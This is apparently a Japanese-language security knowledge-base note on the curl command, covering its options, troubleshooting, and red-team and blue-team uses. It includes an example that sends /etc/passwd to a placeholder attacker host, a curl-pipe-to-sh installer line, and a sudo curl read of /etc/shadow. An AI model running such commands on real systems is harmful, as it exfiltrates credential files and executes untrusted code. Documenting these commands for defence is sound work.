---
# --- YAML Frontmatter ---
created: 2026-02-22 21:10
modified: 2026-02-23 09:52
environment: [OS/Linux, OS/macOS, OS/Windows]
vulnearability: [RCE, SSRF, Information_Disclosure, Data_Exfiltration]
knowledge_category: Command
tags:
  - curl
  - network
  - http
  - api
  - data_transfer
  - knowledge_base
---

# Command - Linux - curl - 指定したURLを使用してデータを転送する

## 概要

`curl` は、HTTP, HTTPS, FTP, SMTP など多数のプロトコルをサポートし、サーバーとの間でデータをやり取りするためのコマンドラインツールです。単なるファイルダウンロードにとどまらず、複雑な HTTP リクエストの構築（ヘッダー指定、POSTデータ、認証など）が可能です。

(出自: Daniel Stenberg により開発。ほぼ全ての OS に標準搭載)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `wget` | ダウンロードに特化。再帰的ダウンロード（サイト丸ごと）が得意。 | 単純なファイル取得 |
| `httpie` | 出力が色付けされ、構文が直感的なモダンなツール。 | 開発中のAPIテスト |
| `nc` (netcat) | より低層（TCP/UDP）で動作。プロトコルの作法を自分で書く必要がある。 | rawパケット操作 |
| `curl` | 非常に多機能。スクリプトに組み込みやすく、ほぼ全環境で利用可能。 | **汎用的な自動化・テスト** |

## よく連携されるコマンド

### シナリオ例: インストールスクリプトの実行 (運用・構築視点)

* **目的**: ネット上のスクリプトをダウンロードして、そのまま実行する。
* **連携コマンド**: `bash`, `sh`, `sudo`
* **解説**: パイプを使って標準入力をシェルに渡します。※信頼できるソース以外では危険な操作です。
* **コマンド例**:
    ```bash
    # 特定のツールのインストーラを実行
    curl -fsSL [https://example.com/install.sh](https://example.com/install.sh) | sh
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **入出力制御** | |
| ⭐️ `-o <file>` | 取得した内容を指定したファイル名で保存する。 |
| ⭐️ `-O` | リモートのファイル名をそのまま使ってローカルに保存する。 |
| ⭐️ `-L` | 3xx 系のリダイレクトに自動で追従する。 |
| `-s`, `--silent` | プログレスメーターやエラーを表示しない。 |
| **リクエスト詳細** | |
| ⭐️ `-X <METHOD>` | HTTP メソッドを指定する（GET, POST, PUT, DELETE 等）。 |
| ⭐️ `-H "Header: Value"` | カスタム HTTP ヘッダーを追加する。 |
| ⭐️ `-d "data"` | POST リクエストで送信するデータを指定する。 |
| ⭐️ `-k`, `--insecure` | SSL 証明書の検証をスキップする（自己署名証明書環境等で使用）。 |
| **デバッグ・情報** | |
| `-v`, `--verbose` | リクエストとレスポンスのヘッダーを含む詳細を表示する。 |
| `-I`, `--head` | ヘッダー情報のみを取得して表示する。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: API エンドポイントへの JSON データの送信テスト。
* **組み合わせ**: `-X POST -H "Content-Type: application/json" -d`
* **解説**: サーバーが正しく JSON を受け取り、期待通りのレスポンスを返すか確認します。
* **例**:
    ```bash
    curl -X POST [https://api.example.com/v1/login](https://api.example.com/v1/login) \
         -H "Content-Type: application/json" \
         -d '{"username":"admin", "password":"password123"}'
    ```

### 2. ブルーチーム視点

* **タスク**: 不審なドメインのサーバー情報の調査。
* **組み合わせ**: `-I` または `-v`
* **解説**: ブラウザでアクセスせずにヘッダー情報を取得し、サーバーの種類（Server ヘッダー）や不審な Cookie、リダイレクト先を安全に確認します。
* **例**:
    ```bash
    # サーバーのバナー情報を確認
    curl -I [http://suspicious-site.com](http://suspicious-site.com)
    ```

### 3. レッドチーム視点

* **タスク**: SSRF (Server-Side Request Forgery) の検証や、窃取したデータの送信。
* **組み合わせ**: `-d @<file>` (ファイル内容の送信)
* **解説**: `/etc/passwd` などの機密ファイルを、攻撃者のサーバーへ POST リクエストで送り出します。
* **例**:
    ```bash
    # 機密ファイルを攻撃者のリスナーへ送信（持ち出し）
    curl -X POST [http://attacker.com/collect](http://attacker.com/collect) -d @/etc/passwd
    ```

## エラーメッセージとトラブルシューティング

1.  **エラーメッセージ例 1**: `curl: (7) Failed to connect to ... port 80: Connection refused`
    * **考えられる原因**: サーバーが起動していない、またはファイアウォールでブロックされている。
    * **解決策**: ポート番号の確認と、`telnet` や `nc` で疎通確認を行う。

2.  **エラーメッセージ例 2**: `curl: (60) SSL certificate problem: self signed certificate`
    * **考えられる原因**: 接続先が自己署名証明書（オレオレ証明書）を使用している。
    * **解決策**: テスト環境であれば `-k` オプションで回避する。本番環境では証明書を正しく更新する。

## 環境変数と設定ファイル

* **`~/.curlrc`**: よく使うオプション（`-L` や `-s` など）を記述しておくことで、デフォルトの挙動をカスタマイズできます。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: **SSRF**。アプリケーションがユーザーの入力をそのまま `curl` に渡している場合、内部ネットワークの走査に悪用されます。
* **悪用シナリオ**: `curl ... | bash` のパイプ実行。攻撃者が接続途中でペイロードをすり替える（または OS を判別して挙動を変える）ことで、管理者の端末を乗っ取ります。

### GTFOBins における利用例

`curl` に `sudo` 権限がある場合、任意のファイルを読み取ったり（URLとしてファイルパスを指定）、書き込んだりすることが可能です。

* **機能**: `File Read`, `File Write`, `Sudo`
* **コマンド例**:
    ```bash
    # sudo curl を使ってローカルファイルを読み取る (URLの代わりに file:// を使用)
    sudo curl file:///etc/shadow
    ```
* **参照**: `https://gtfobins.github.io/gtfobins/curl/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: サーバーからのアウトバウンド通信（特に 80/443 ポート）を制限し、許可されたドメイン以外への `curl` 実行を遮断する。
* **Detection (検知)**: ユーザーエージェントに `curl/X.X.X` が含まれる不審な内部通信を WAF や IDS で検知する。

## 注意点・補足

* **URLのクォート**: URL に `&` や `?` が含まれる場合、シェルが特殊文字として解釈してしまうため、必ず `"https://example.com/q?id=1&name=test"` のようにダブルクォートで囲みましょう。
* **プロキシ**: `export http_proxy="http://proxy.server:8080"` のように環境変数を設定すれば、`curl` も自動的にプロキシを経由します。